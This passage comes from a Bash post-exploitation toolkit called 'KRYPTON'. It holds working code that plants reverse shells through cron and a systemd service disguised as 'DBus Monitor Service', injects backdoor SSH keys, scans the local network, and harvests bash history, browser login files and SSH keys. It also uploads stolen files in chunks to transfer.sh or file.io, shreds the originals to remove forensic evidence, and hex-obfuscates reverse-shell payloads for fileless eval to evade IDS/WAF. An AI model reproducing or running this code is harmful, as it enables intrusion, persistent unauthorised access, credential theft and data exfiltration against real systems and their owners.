                echo -n "${BRIGHT_WHITE}Enter reverse shell port: ${RESET}"
                read target_port
            fi
            
            # Generate systemd service file
            SERVICE_FILE="/tmp/dbus-monitor.service"
            
            cat > "$SERVICE_FILE" << SERVICE_EOF
[Unit]
Description=DBus Monitor Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$target_host/$target_port 0>&1'
Restart=always
RestartSec=30s

[Install]
WantedBy=multi-user.target
SERVICE_EOF
            
            echo ""
            echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
            echo "${BOLD}${BRIGHT_WHITE}              SYSTEMD SERVICE FILE${RESET}"
            echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
            echo ""
            cat "$SERVICE_FILE"
            echo ""
            
            echo -n "${BRIGHT_WHITE}Install service to /etc/systemd/system/? [y/N]: ${RESET}"
            read confirm_service
            
            if [[ "$confirm_service" =~ ^[Yy]$ ]]; then
                if [ -w /etc/systemd/system ]; then
                    cp "$SERVICE_FILE" /etc/systemd/system/dbus-monitor.service
                    systemctl daemon-reload 2>/dev/null
                    systemctl enable dbus-monitor.service 2>/dev/null
                    systemctl start dbus-monitor.service 2>/dev/null
                    show_status "active" "Systemd service installed and started"
                else
                    show_status "error" "Insufficient permissions to install systemd service"
                fi
            else
                show_status "warning" "Service not installed"
            fi
            
            rm -f "$SERVICE_FILE"
            ;;
            
        3)
            # SSH-Key Injection
            echo ""
            show_status "info" "SSH-Key Injection"
            echo ""
            
            echo -n "${BRIGHT_WHITE}Enter SSH public key (or press Enter to generate a new key pair): ${RESET}"
            read ssh_public_key
            
            if [ -z "$ssh_public_key" ]; then
                echo ""
                show_status "info" "Generating new SSH key pair..."
                
                KEY_PATH="/tmp/krypton_id_rsa"
                ssh-keygen -t rsa -b 4096 -f "$KEY_PATH" -N "" -C "krypton@backdoor" 2>/dev/null
                
                if [ -f "$KEY_PATH.pub" ]; then
                    ssh_public_key=$(cat "$KEY_PATH.pub")
                    echo ""
                    show_status "active" "Key pair generated"
                    echo ""
                    echo "${BRIGHT_WHITE}Private key saved to: $KEY_PATH${RESET}"
                    echo "${BRIGHT_WHITE}Public key:${RESET}"
                    echo "${BRIGHT_GREEN}$ssh_public_key${RESET}"
                    echo ""
                    
                    # Save private key info
                    echo "$KEY_PATH" > /tmp/krypton_ssh_key_path.txt
                else
                    show_status "error" "Failed to generate SSH key pair"
                    echo ""
                    read -p "Press Enter to continue..."
                    return 1
                fi
            fi
            
            echo ""
            echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
            echo "${BRIGHT_WHITE}Target user for SSH key injection: $(whoami)${RESET}"
            echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
            echo ""
            
            SSH_DIR="$HOME/.ssh"
            AUTH_KEYS="$SSH_DIR/authorized_keys"
            
            # Create .ssh directory if it doesn't exist
            if [ ! -d "$SSH_DIR" ]; then
                mkdir -p "$SSH_DIR" 2>/dev/null
                chmod 700 "$SSH_DIR" 2>/dev/null
            fi
            
            # Check if key already exists
            if [ -f "$AUTH_KEYS" ]; then
                if grep -q "$ssh_public_key" "$AUTH_KEYS"; then
                    show_status "warning" "SSH key already exists in authorized_keys"
                else
                    echo "$ssh_public_key" >> "$AUTH_KEYS"
                    chmod 600 "$AUTH_KEYS" 2>/dev/null
                    show_status "active" "SSH key added to authorized_keys"
                fi
            else
                echo "$ssh_public_key" > "$AUTH_KEYS"
                chmod 600 "$AUTH_KEYS" 2>/dev/null
                show_status "active" "SSH key added to authorized_keys (new file)"
            fi
            ;;
            
        4)
            # All methods
            echo ""
            show_status "info" "Deploying All Persistence Methods"
            echo ""
            
            # Get connection info once
            if [ -f /tmp/krypton_tunnel_info.txt ]; then
                TUNNEL_INFO=$(cat /tmp/krypton_tunnel_info.txt)
                target_host=$(echo $TUNNEL_INFO | cut -d: -f1 | sed 's/tcp:\/\///')
                target_port=$(echo $TUNNEL_INFO | cut -d: -f2)
            else
                echo -n "${BRIGHT_WHITE}Enter reverse shell host: ${RESET}"
                read target_host
                echo -n "${BRIGHT_WHITE}Enter reverse shell port: ${RESET}"
                read target_port
            fi
            
            echo -n "${BRIGHT_WHITE}Deploy all persistence methods? [y/N]: ${RESET}"
            read confirm_all
            
            if [[ "$confirm_all" =~ ^[Yy]$ ]]; then
                # Cron
                CRON_PAYLOAD="*/30 * * * * bash -c 'bash -i >& /dev/tcp/$target_host/$target_port 0>&1' # $(date +%s | md5sum | head -c 8)"
                (crontab -l 2>/dev/null; echo "$CRON_PAYLOAD") | crontab - 2>/dev/null
                show_status "active" "Cron entry added"
                
                # Systemd
                SERVICE_FILE="/tmp/dbus-monitor.service"
                cat > "$SERVICE_FILE" << SERVICE_EOF
[Unit]
Description=DBus Monitor Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$target_host/$target_port 0>&1'
Restart=always
RestartSec=30s

[Install]
WantedBy=multi-user.target
SERVICE_EOF
                if [ -w /etc/systemd/system ]; then
                    cp "$SERVICE_FILE" /etc/systemd/system/dbus-monitor.service
                    systemctl daemon-reload 2>/dev/null
                    systemctl enable dbus-monitor.service 2>/dev/null
                    systemctl start dbus-monitor.service 2>/dev/null
                    show_status "active" "Systemd service installed"
                else
                    show_status "warning" "Systemd service skipped (no permissions)"
                fi
                rm -f "$SERVICE_FILE"
                
                # SSH Key
                KEY_PATH="/tmp/krypton_id_rsa"
                ssh-keygen -t rsa -b 4096 -f "$KEY_PATH" -N "" -C "krypton@backdoor" 2>/dev/null
                if [ -f "$KEY_PATH.pub" ]; then
                    ssh_public_key=$(cat "$KEY_PATH.pub")
                    SSH_DIR="$HOME/.ssh"
                    AUTH_KEYS="$SSH_DIR/authorized_keys"
                    mkdir -p "$SSH_DIR" 2>/dev/null
                    chmod 700 "$SSH_DIR" 2>/dev/null
                    echo "$ssh_public_key" >> "$AUTH_KEYS"
                    chmod 600 "$AUTH_KEYS" 2>/dev/null
                    show_status "active" "SSH key injected"
                    echo "$KEY_PATH" > /tmp/krypton_ssh_key_path.txt
                fi
                
                echo ""
                show_status "active" "All persistence methods deployed"
            else
                show_status "warning" "Deployment cancelled"
            fi
            ;;
            
        0)
            return 0
            ;;
            
        *)
            show_status "error" "Invalid option"
            ;;
    esac
    
    echo ""
    read -p "Press Enter to continue..."
}

# Network Pivoting & Lateral Discovery module
network_pivoting_module() {
    echo ""
    show_status "info" "KRYPTON Network Pivoting & Lateral Discovery"
    echo ""
    
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo "${BOLD}${BRIGHT_WHITE}              NETWORK DISCOVERY OPTIONS${RESET}"
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo ""
    echo "${BRIGHT_WHITE}[1]${RESET} Internal Ping Sweep (scan /24 subnet)"
    echo "${BRIGHT_WHITE}[2]${RESET} Port Discovery (SSH:22, SMB:445, RDP:3389)"
    echo "${BRIGHT_WHITE}[3]${RESET} Credential Harvesting"
    echo "${BRIGHT_WHITE}[4]${RESET} Full Network Scan (all above)"
    echo "${BRIGHT_WHITE}[0]${RESET} Back to Main Menu"
    echo ""
    echo -n "${BOLD}${BRIGHT_WHITE}Select option [0-4]: ${RESET}"
    read pivot_choice
    
    case $pivot_choice in
        1)
            # Internal Ping Sweep
            echo ""
            show_status "info" "Internal Ping Sweep"
            echo ""
            
            # Detect local IP and subnet
            LOCAL_IP=$(ip route get 1 2>/dev/null | awk '{print $7}' | head -1)
            if [ -z "$LOCAL_IP" ]; then
                LOCAL_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
            fi
            
            if [ -z "$LOCAL_IP" ]; then
                show_status "error" "Could not detect local IP address"
                echo ""
                read -p "Press Enter to continue..."
                return 1
            fi
            
            # Extract subnet (first 3 octets)
            SUBNET=$(echo $LOCAL_IP | cut -d. -f1-3)
            
            echo "${BRIGHT_WHITE}Local IP: $LOCAL_IP${RESET}"
            echo "${BRIGHT_WHITE}Scanning subnet: ${BRIGHT_GREEN}$SUBNET.0/24${RESET}"
            echo ""
            
            show_status "info" "Starting multi-threaded ping sweep..."
            echo ""
            
            # Multi-threaded ping sweep using background processes
            ACTIVE_HOSTS=()
            TEMP_RESULTS=$(mktemp)
            
            for i in {1..254}; do
                {
                    IP="$SUBNET.$i"
                    if ping -c 1 -W 1 "$IP" &>/dev/null; then
                        echo "$IP" >> "$TEMP_RESULTS"
                    fi
                } &
            done
            
            # Wait for all background processes
            wait
            
            # Read results
            if [ -f "$TEMP_RESULTS" ]; then
                ACTIVE_HOSTS=($(cat "$TEMP_RESULTS" | sort -V))
                rm -f "$TEMP_RESULTS"
            fi
            
            # Display results
            echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
            echo "${BOLD}${BRIGHT_WHITE}              ACTIVE HOSTS DISCOVERED${RESET}"
            echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
            echo ""
            
            if [ ${#ACTIVE_HOSTS[@]} -gt 0 ]; then
                show_status "active" "Found ${#ACTIVE_HOSTS[@]} active host(s)"
                echo ""
                for host in "${ACTIVE_HOSTS[@]}"; do
                    if [ "$host" != "$LOCAL_IP" ]; then
                        echo -e "${BRIGHT_GREEN}[*]${RESET} ${BRIGHT_WHITE}$host${RESET}"
                    fi
                done
                echo ""
                
                # Save to file for port scanning
                echo "${ACTIVE_HOSTS[@]}" > /tmp/krypton_active_hosts.txt
                show_status "info" "Active hosts saved to /tmp/krypton_active_hosts.txt"
            else
                show_status "warning" "No active hosts found (excluding local machine)"
            fi
            ;;
            
        2)
            # Port Discovery
            echo ""
            show_status "info" "Port Discovery"
            echo ""
            
            # Load previously discovered hosts or ask for input
            if [ -f /tmp/krypton_active_hosts.txt ]; then
                HOSTS_TO_SCAN=$(cat /tmp/krypton_active_hosts.txt)
                echo "${BRIGHT_YELLOW}Using previously discovered hosts${RESET}"
                echo "${BRIGHT_WHITE}Hosts: $HOSTS_TO_SCAN${RESET}"
                echo ""
                echo -n "${BRIGHT_WHITE}Use these hosts? [Y/n]: ${RESET}"
                read use_saved
                if [[ ! "$use_saved" =~ ^[Yy]$ ]] && [ -n "$use_saved" ]; then
                    echo -n "${BRIGHT_WHITE}Enter target hosts (space-separated): ${RESET}"
                    read HOSTS_TO_SCAN
                fi
            else
                echo -n "${BRIGHT_WHITE}Enter target hosts (space-separated): ${RESET}"
                read HOSTS_TO_SCAN
            fi
            
            if [ -z "$HOSTS_TO_SCAN" ]; then
                show_status "error" "No hosts specified"
                echo ""
                read -p "Press Enter to continue..."
                return 1
            fi
            
            echo ""
            show_status "info" "Scanning ports 22 (SSH), 445 (SMB), 3389 (RDP)..."
            echo ""
            
            # Port scanning
            for host in $HOSTS_TO_SCAN; do
                echo "${BRIGHT_WHITE}Scanning $host...${RESET}"
                
                # SSH (22)
                if timeout 2 bash -c "echo >/dev/tcp/$host/22" 2>/dev/null; then
                    echo -e "${BRIGHT_GREEN}[OPEN]${RESET} ${BRIGHT_WHITE}$host:22${RESET} ${BRIGHT_CYAN}(SSH)${RESET}"
                fi
                
                # SMB (445)
                if timeout 2 bash -c "echo >/dev/tcp/$host/445" 2>/dev/null; then
                    echo -e "${BRIGHT_GREEN}[OPEN]${RESET} ${BRIGHT_WHITE}$host:445${RESET} ${BRIGHT_CYAN}(SMB)${RESET}"
                fi
                
                # RDP (3389)
                if timeout 2 bash -c "echo >/dev/tcp/$host/3389" 2>/dev/null; then
                    echo -e "${BRIGHT_GREEN}[OPEN]${RESET} ${BRIGHT_WHITE}$host:3389${RESET} ${BRIGHT_CYAN}(RDP)${RESET}"
                fi
            done
            ;;
            
        3)
            # Credential Harvesting
            echo ""
            show_status "info" "Credential Harvesting"
            echo ""
            
            echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
            echo "${BOLD}${BRIGHT_WHITE}              CREDENTIAL EXTRACTION${RESET}"
            echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
            echo ""
            
            # /etc/hosts
            if [ -f /etc/hosts ]; then
                echo "${BRIGHT_WHITE}[+] /etc/hosts:${RESET}"
                echo "${BRIGHT_YELLOW}$(cat /etc/hosts)${RESET}"
                echo ""
            fi
            
            # ~/.bash_history
            if [ -f ~/.bash_history ]; then
                echo "${BRIGHT_WHITE}[+] ~/.bash_history (last 50 lines):${RESET}"
                tail -n 50 ~/.bash_history 2>/dev/null
                echo ""
            fi
            
            # Search for password patterns in history
            echo "${BRIGHT_WHITE}[+] Password-like patterns in history:${RESET}"
            if [ -f ~/.bash_history ]; then
                grep -iE "(password|passwd|pass|secret|key|token)" ~/.bash_history 2>/dev/null || echo "No matches found"
            fi
            echo ""
            
            # Browser configuration files
            echo "${BRIGHT_WHITE}[+] Browser configuration files:${RESET}"
            
            # Firefox
            FIREFOX_DIRS=$(find "$HOME/.mozilla/firefox" -name "*.default*" -type d 2>/dev/null)
            if [ -n "$FIREFOX_DIRS" ]; then
                echo "${BRIGHT_CYAN}Firefox profiles found:${RESET}"
                echo "$FIREFOX_DIRS"
                
                for dir in $FIREFOX_DIRS; do
                    if [ -f "$dir/places.sqlite" ]; then
                        echo "${BRIGHT_YELLOW}  - History database: $dir/places.sqlite${RESET}"
                    fi
                    if [ -f "$dir/logins.json" ]; then
                        echo "${BRIGHT_YELLOW}  - Saved logins: $dir/logins.json${RESET}"
                    fi
                    if [ -f "$dir/key4.db" ]; then
                        echo "${BRIGHT_YELLOW}  - Key database: $dir/key4.db${RESET}"
                    fi
                done
            else
                echo "No Firefox profiles found"
            fi
            echo ""
            
            # Chrome
            CHROME_DIRS=$(find "$HOME/.config/google-chrome" -name "Default" -type d 2>/dev/null)
            if [ -z "$CHROME_DIRS" ]; then
                CHROME_DIRS=$(find "$HOME/.config/chromium" -name "Default" -type d 2>/dev/null)
            fi
            
            if [ -n "$CHROME_DIRS" ]; then
                echo "${BRIGHT_CYAN}Chrome/Chromium profiles found:${RESET}"
                echo "$CHROME_DIRS"
                
                for dir in $CHROME_DIRS; do
                    if [ -f "$dir/History" ]; then
                        echo "${BRIGHT_YELLOW}  - History database: $dir/History${RESET}"
                    fi
                    if [ -f "$dir/Login Data" ]; then
                        echo "${BRIGHT_YELLOW}  - Saved logins: $dir/Login Data${RESET}"
                    fi
                    if [ -f "$dir/Cookies" ]; then
                        echo "${BRIGHT_YELLOW}  - Cookies: $dir/Cookies${RESET}"
                    fi
                done
            else
                echo "No Chrome/Chromium profiles found"
            fi
            echo ""
            
            # SSH keys
            echo "${BRIGHT_WHITE}[+] SSH keys:${RESET}"
            SSH_KEYS=$(find "$HOME/.ssh" -type f 2>/dev/null)
            if [ -n "$SSH_KEYS" ]; then
                echo "$SSH_KEYS"
            else
                echo "No SSH keys found"
            fi
            echo ""
            
            # Save all findings
            echo "${BRIGHT_WHITE}[+] Saving findings to /tmp/krypton_credentials.txt${RESET}"
            {
                echo "=== KRYPTON CREDENTIAL HARVESTING ==="
                echo "Timestamp: $(date)"
                echo ""
                echo "=== /etc/hosts ==="
                cat /etc/hosts 2>/dev/null
                echo ""
                echo "=== ~/.bash_history (last 50) ==="
                tail -n 50 ~/.bash_history 2>/dev/null
                echo ""
                echo "=== Browser Configs ==="
                find "$HOME/.mozilla/firefox" -name "*.default*" -type d 2>/dev/null
                find "$HOME/.config/google-chrome" -name "Default" -type d 2>/dev/null
                find "$HOME/.config/chromium" -name "Default" -type d 2>/dev/null
                echo ""
                echo "=== SSH Keys ==="
                find "$HOME/.ssh" -type f 2>/dev/null
            } > /tmp/krypton_credentials.txt
            
            show_status "active" "Credentials saved to /tmp/krypton_credentials.txt"
            ;;
            
        4)
            # Full Network Scan
            echo ""
            show_status "info" "Full Network Scan"
            echo ""
            
            # Ping sweep
            LOCAL_IP=$(ip route get 1 2>/dev/null | awk '{print $7}' | head -1)
            if [ -z "$LOCAL_IP" ]; then
                LOCAL_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
            fi
            
            if [ -z "$LOCAL_IP" ]; then
                show_status "error" "Could not detect local IP address"
                echo ""
                read -p "Press Enter to continue..."
                return 1
            fi
            
            SUBNET=$(echo $LOCAL_IP | cut -d. -f1-3)
            echo "${BRIGHT_WHITE}Scanning subnet: ${BRIGHT_GREEN}$SUBNET.0/24${RESET}"
            echo ""
            
            TEMP_RESULTS=$(mktemp)
            for i in {1..254}; do
                {
                    IP="$SUBNET.$i"
                    if ping -c 1 -W 1 "$IP" &>/dev/null; then
                        echo "$IP" >> "$TEMP_RESULTS"
                    fi
                } &
            done
            wait
            
            ACTIVE_HOSTS=()
            if [ -f "$TEMP_RESULTS" ]; then
                ACTIVE_HOSTS=($(cat "$TEMP_RESULTS" | sort -V))
                rm -f "$TEMP_RESULTS"
            fi
            
            echo "${BRIGHT_WHITE}Active hosts: ${#ACTIVE_HOSTS[@]}${RESET}"
            
            # Port scan
            echo ""
            echo "${BRIGHT_WHITE}Scanning ports...${RESET}"
            for host in "${ACTIVE_HOSTS[@]}"; do
                if [ "$host" != "$LOCAL_IP" ]; then
                    echo "${BRIGHT_WHITE}$host:${RESET}"
                    if timeout 2 bash -c "echo >/dev/tcp/$host/22" 2>/dev/null; then
                        echo -e "  ${BRIGHT_GREEN}[OPEN]${RESET} 22 (SSH)"
                    fi
                    if timeout 2 bash -c "echo >/dev/tcp/$host/445" 2>/dev/null; then
                        echo -e "  ${BRIGHT_GREEN}[OPEN]${RESET} 445 (SMB)"
                    fi
                    if timeout 2 bash -c "echo >/dev/tcp/$host/3389" 2>/dev/null; then
                        echo -e "  ${BRIGHT_GREEN}[OPEN]${RESET} 3389 (RDP)"
                    fi
                fi
            done
            
            # Credential harvest
            echo ""
            show_status "info" "Harvesting credentials..."
            {
                echo "=== KRYPTON FULL NETWORK SCAN ==="
                echo "Timestamp: $(date)"
                echo "Subnet: $SUBNET.0/24"
                echo "Active hosts: ${ACTIVE_HOSTS[@]}"
                echo ""
                echo "=== /etc/hosts ==="
                cat /etc/hosts 2>/dev/null
                echo ""
                echo "=== ~/.bash_history (last 50) ==="
                tail -n 50 ~/.bash_history 2>/dev/null
            } > /tmp/krypton_full_scan.txt
            
            show_status "active" "Full scan results saved to /tmp/krypton_full_scan.txt"
            ;;
            
        0)
            return 0
            ;;
            
        *)
            show_status "error" "Invalid option"
            ;;
    esac
    
    echo ""
    read -p "Press Enter to continue..."
}

# Multi-Channel Exfiltration module
multi_channel_exfiltration() {
    local target_file=""
    local upload_url=""
    local chunk_size="10M"
    
    echo ""
    show_status "info" "KRYPTON Multi-Channel Exfiltration"
    echo ""
    
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo "${BOLD}${BRIGHT_WHITE}              HIGH-VOLUME DATA EXFILTRATION${RESET}"
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo ""
    
    # Get target file
    echo -n "${BRIGHT_WHITE}Enter file to exfiltrate (.sql, .tar.gz, etc.): ${RESET}"
    read target_file
    
    if [ ! -f "$target_file" ]; then
        show_status "error" "File not found: $target_file"
        echo ""
        read -p "Press Enter to continue..."
        return 1
    fi
    
    FILE_SIZE=$(du -h "$target_file" | cut -f1)
    echo "${BRIGHT_WHITE}File size: $FILE_SIZE${RESET}"
    echo ""
    
    # Get upload URL
    echo -n "${BRIGHT_WHITE}Enter upload URL (e.g., https://transfer.sh, http://file.io): ${RESET}"
    read upload_url
    
    if [ -z "$upload_url" ]; then
        show_status "error" "Upload URL is required"
        echo ""
        read -p "Press Enter to continue..."
        return 1
    fi
    
    echo ""
    show_status "info" "Starting exfiltration process..."
    echo ""
    
    # Create temporary working directory
    TEMP_DIR=$(mktemp -d)
    CHUNK_DIR="$TEMP_DIR/chunks"
    mkdir -p "$CHUNK_DIR"
    
    # Chunk the file
    echo "${BRIGHT_WHITE}[1/4] Chunking file into 10MB parts...${RESET}"
    split -b "$chunk_size" "$target_file" "$CHUNK_DIR/chunk_" 2>/dev/null
    
    if [ $? -ne 0 ]; then
        show_status "error" "Failed to chunk file"
        rm -rf "$TEMP_DIR"
        echo ""
        read -p "Press Enter to continue..."
        return 1
    fi
    
    CHUNK_COUNT=$(ls -1 "$CHUNK_DIR" | wc -l)
    show_status "active" "File split into $CHUNK_COUNT chunk(s)"
    echo ""
    
    # Upload chunks
    echo "${BRIGHT_WHITE}[2/4] Uploading chunks via HTTP...${RESET}"
    echo ""
    
    UPLOAD_SUCCESS=0
    UPLOAD_FAILED=0
    UPLOADED_URLS=()
    
    CHUNK_NUM=0
    for chunk in "$CHUNK_DIR"/chunk_*; do
        CHUNK_NUM=$((CHUNK_NUM + 1))
        CHUNK_NAME=$(basename "$chunk")
        echo -n "${BRIGHT_WHITE}Uploading chunk $CHUNK_NUM/$CHUNK_COUNT ($CHUNK_NAME)... ${RESET}"
        
        # Upload using curl (try multiple services)
        UPLOAD_RESULT=""
        
        # Method 1: transfer.sh
        if echo "$upload_url" | grep -q "transfer.sh"; then
            UPLOAD_RESULT=$(curl -s --upload-file "$chunk" "https://transfer.sh/$CHUNK_NAME" 2>/dev/null)
        # Method 2: file.io
        elif echo "$upload_url" | grep -q "file.io"; then
            UPLOAD_RESULT=$(curl -s -F "file=@$chunk" "https://file.io" 2>/dev/null | grep -o '"link":"[^"]*' | cut -d'"' -f4)
        # Method 3: Custom URL
        else
            UPLOAD_RESULT=$(curl -s -F "file=@$chunk" "$upload_url" 2>/dev/null)
        fi
        
        if [ -n "$UPLOAD_RESULT" ]; then
            echo -e "${BRIGHT_GREEN}[SUCCESS]${RESET}"
            UPLOADED_URLS+=("$CHUNK_NAME: $UPLOAD_RESULT")
            UPLOAD_SUCCESS=$((UPLOAD_SUCCESS + 1))
            
            # Delete chunk immediately after successful upload
            rm -f "$chunk"
        else
            echo -e "${BRIGHT_RED}[FAILED]${RESET}"
            UPLOAD_FAILED=$((UPLOAD_FAILED + 1))
        fi
    done
    
    echo ""
    echo "${BRIGHT_WHITE}Upload Summary:${RESET}"
    echo "${BRIGHT_GREEN}Successful: $UPLOAD_SUCCESS${RESET}"
    echo "${BRIGHT_RED}Failed: $UPLOAD_FAILED${RESET}"
    echo ""
    
    # Display uploaded URLs
    if [ ${#UPLOADED_URLS[@]} -gt 0 ]; then
        echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
        echo "${BOLD}${BRIGHT_WHITE}              UPLOADED CHUNK URLs${RESET}"
        echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
        echo ""
        for url in "${UPLOADED_URLS[@]}"; do
            echo "${BRIGHT_GREEN}$url${RESET}"
        done
        echo ""
        
        # Save URLs to file
        {
            echo "=== KRYPTON MULTI-CHANNEL EXFILTRATION ==="
            echo "Timestamp: $(date)"
            echo "Source file: $target_file"
            echo "File size: $FILE_SIZE"
            echo "Chunks: $CHUNK_COUNT"
            echo "Successful uploads: $UPLOAD_SUCCESS"
            echo ""
            echo "=== UPLOAD URLs ==="
            for url in "${UPLOADED_URLS[@]}"; do
                echo "$url"
            done
        } > /tmp/krypton_exfiltration_urls.txt
        
        show_status "info" "URLs saved to /tmp/krypton_exfiltration_urls.txt"
    fi
    
    # Verification and cleanup
    echo ""
    echo "${BRIGHT_WHITE}[3/4] Verifying upload and cleaning chunks...${RESET}"
    
    # Verify all chunks are deleted
    REMAINING_CHUNKS=$(ls -1 "$CHUNK_DIR" 2>/dev/null | wc -l)
    if [ $REMAINING_CHUNKS -eq 0 ]; then
        show_status "active" "All chunks verified deleted"
    else
        show_status "warning" "$REMAINING_CHUNKS chunk(s) remain, forcing deletion"
        rm -rf "$CHUNK_DIR"
    fi
    
    echo ""
    
    # Delete original file after verification
    echo "${BRIGHT_WHITE}[4/4] Deleting original file (zero forensic evidence)...${RESET}"
    echo -n "${BRIGHT_RED}WARNING: This will permanently delete $target_file. Confirm? [y/N]: ${RESET}"
    read confirm_delete
    
    if [[ "$confirm_delete" =~ ^[Yy]$ ]]; then
        # Securely delete if shred is available
        if command -v shred &> /dev/null; then
            shred -vfuz "$target_file" 2>/dev/null
            show_status "active" "Original file securely shredded"
        else
            rm -f "$target_file"
            show_status "active" "Original file deleted"
        fi
    else
        show_status "warning" "Original file preserved"
    fi
    
    # Clean up temp directory
    rm -rf "$TEMP_DIR"
    
    echo ""
    show_status "active" "Exfiltration process complete"
    echo ""
    echo "${BRIGHT_YELLOW}Zero forensic evidence maintained${RESET}"
    echo ""
    
    read -p "Press Enter to continue..."
}

# Advanced Payload Obfuscation Engine
advanced_obfuscation_engine() {
    local bash_payload=""
    local target_host=""
    local target_port=""
    
    echo ""
    show_status "info" "KRYPTON Advanced Payload Obfuscation Engine"
    echo ""
    
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo "${BOLD}${BRIGHT_WHITE}              MULTI-LAYER OBFUSCATION${RESET}"
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo ""
    echo "${BRIGHT_YELLOW}This engine creates fileless payloads that bypass WAF/IDS detection${RESET}"
    echo "${BRIGHT_WHITE}• Multi-Layer: Hex Encoding + Reverse-String Logic${RESET}"
    echo "${BRIGHT_WHITE}• Execution: Fileless via printf + eval (RAM-only)${RESET}"
    echo "${BRIGHT_WHITE}• Result: Firewall sees only random hex characters${RESET}"
    echo ""
    
    # Get target connection info
    if [ -f /tmp/krypton_tunnel_info.txt ]; then
        TUNNEL_INFO=$(cat /tmp/krypton_tunnel_info.txt)
        AUTO_HOST=$(echo $TUNNEL_INFO | cut -d: -f1 | sed 's/tcp:\/\///')
        AUTO_PORT=$(echo $TUNNEL_INFO | cut -d: -f2)
        
        echo "${BRIGHT_YELLOW}Active tunnel detected: $AUTO_HOST:$AUTO_PORT${RESET}"
        echo -n "${BRIGHT_WHITE}Use this tunnel? [Y/n]: ${RESET}"
        read use_auto
        
        if [[ "$use_auto" =~ ^[Yy]$ ]] || [ -z "$use_auto" ]; then
            target_host=$AUTO_HOST
            target_port=$AUTO_PORT
        fi
    fi
    
    if [ -z "$target_host" ]; then
        echo -n "${BRIGHT_WHITE}Enter target host: ${RESET}"
        read target_host
        echo -n "${BRIGHT_WHITE}Enter target port: ${RESET}"
        read target_port
    fi
    
    # Custom payload option
    echo ""
    echo -n "${BRIGHT_WHITE}Use custom bash payload? [y/N]: ${RESET}"
    read use_custom
    
    if [[ "$use_custom" =~ ^[Yy]$ ]]; then
        echo -n "${BRIGHT_WHITE}Enter bash command: ${RESET}"
        read bash_payload
    else
        # Default reverse shell payload
        bash_payload="unset HISTFILE; bash -i >& /dev/tcp/$target_host/$target_port 0>&1"
    fi
    
    echo ""
    show_status "info" "Applying multi-layer obfuscation..."
    echo ""
    
    # Layer 1: Hex Encoding
    echo "${BRIGHT_WHITE}[Layer 1] Converting to Hex...${RESET}"
    HEX_ENCODED=$(echo -n "$bash_payload" | xxd -p | tr -d '\n' | tr -d ' ')
    
    # Layer 2: Reverse String Logic
    echo "${BRIGHT_WHITE}[Layer 2] Applying reverse-string logic...${RESET}"
    REVERSED_HEX=$(echo "$HEX_ENCODED" | rev)
    
    # Layer 3: Add random prefix/suffix for additional obfuscation
    RANDOM_PREFIX=$(openssl rand -hex 4 2>/dev/null || echo "a1b2c3d4")
    RANDOM_SUFFIX=$(openssl rand -hex 4 2>/dev/null || echo "e5f6g7h8")
    OBFUSCATED="${RANDOM_PREFIX}${REVERSED_HEX}${RANDOM_SUFFIX}"
    
    echo ""
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo "${BRIGHT_WHITE}Original Payload:${RESET}"
    echo "${BRIGHT_GREEN}$bash_payload${RESET}"
    echo ""
    
    echo "${BRIGHT_WHITE}Layer 1 - Hex Encoded:${RESET}"
    echo "${BRIGHT_YELLOW}$HEX_ENCODED${RESET}"
    echo ""
    
    echo "${BRIGHT_WHITE}Layer 2 - Reversed Hex:${RESET}"
    echo "${BRIGHT_YELLOW}$REVERSED_HEX${RESET}"
    echo ""
    
    echo "${BRIGHT_WHITE}Layer 3 - Final Obfuscated (with random padding):${RESET}"
    echo "${BRIGHT_MAGENTA}$OBFUSCATED${RESET}"
    echo ""
    
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo ""
    
    # Generate fileless execution payload
    echo "${BRIGHT_WHITE}[Fileless Execution Method]${RESET}"
    echo ""
    
    # Method 1: printf + eval (fileless)
    EXEC_PAYLOAD_1="eval \$(printf $(echo "$OBFUSCATED" | sed 's/\(.\{2\}\)/\\x\1/g' | rev | sed 's/^.*\('"$RANDOM_PREFIX"'\)\(.*\)'"$RANDOM_SUFFIX"'.*$/\2/')"
    
    # Method 2: Alternative using echo + xxd
    EXEC_PAYLOAD_2="eval \$(echo '$OBFUSCATED' | sed 's/^.*\('"$RANDOM_PREFIX"'\)\(.*\)'"$RANDOM_SUFFIX"'.*$/\2/' | rev | xxd -r -p)"
    
    echo "${BRIGHT_WHITE}[Option 1] printf + eval (RAM-only):${RESET}"
    echo "${BRIGHT_GREEN}$EXEC_PAYLOAD_1${RESET}"
    echo ""
    
    echo "${BRIGHT_WHITE}[Option 2] xxd decode + eval (RAM-only):${RESET}"
    echo "${BRIGHT_GREEN}$EXEC_PAYLOAD_2${RESET}"
    echo ""
    
    # Save payloads
    {
        echo "=== KRYPTON ADVANCED OBFUSCATION ENGINE ==="
